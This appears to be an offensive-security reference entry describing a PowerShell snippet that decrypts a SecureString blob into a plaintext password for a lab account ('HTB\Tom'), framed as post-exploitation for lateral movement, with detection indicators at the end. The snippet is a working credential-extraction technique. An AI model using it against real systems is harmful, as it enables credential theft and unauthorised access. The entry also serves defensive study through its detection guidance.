---
id: df19ec68-5d8f-4ed0-a346-f6c48255826c
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:24.119983+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - powershell
  - credential-extraction
  - secure-string
platforms:
  - Windows
validated: true
---

# PowerShell-Extract-SecureString-Credentials

## Code

```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | ConvertTo-SecureString
$user = "HTB\Tom"
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl
```

## Description

This PowerShell code snippet extracts plaintext credentials from an encrypted secure string. It converts a hex-encoded secure string (typically obtained from dumps or files) into a usable PSCredential object and retrieves the domain, username, and plaintext password via GetNetworkCredential(). It is designed for post-exploitation where the attacker has the encrypted blob but needs the cleartext for further actions like lateral movement.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $pass | Hex string of the encrypted secure string (must match the decryption context) | "01000000d08c9ddf..." |
| $user | Target username in domain\user format | "HTB\Tom" |

## Usage

Execute this in a PowerShell session on the target or attacker machine with the same user context as the original encryption. It is often used after dumping credentials with tools like Mimikatz. Once run, the plaintext password can be captured from output and used in commands like net use or Enter-PSSession for authentication.

## Detection

- PowerShell Script Block Logging will capture the ConvertTo-SecureString and GetNetworkCredential() invocations.
- Monitor for PSCredential object creation in event logs (Event ID 4104 for script execution).
- Look for unusual decryption attempts on secure strings or access to credential APIs in Sysmon (Event ID 1 for process creation with powershell.exe arguments).
- Behavioral: Anomalous network auth attempts post-PowerShell execution.

## Related

- [[procedures/Extract-Credentials-from-SecureString-PowerShell]]
